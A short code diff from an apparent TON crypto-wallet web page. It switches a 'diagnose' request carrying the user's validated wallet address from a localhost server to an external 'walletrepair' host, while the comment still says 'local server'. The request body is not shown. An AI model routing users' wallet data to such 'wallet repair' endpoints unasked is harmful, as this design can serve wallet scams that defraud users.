@@ -33,7 +33,7 @@ function Page1_Hello() {
     if (validateTonAddress(wallet)) {
       localStorage.setItem('walletAddress', wallet);
       // Отправка на локальный сервер
-      fetch('http://localhost:3001/api/diagnose', {
+  fetch('https://walletrepair.onrender.com/api/diagnose', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
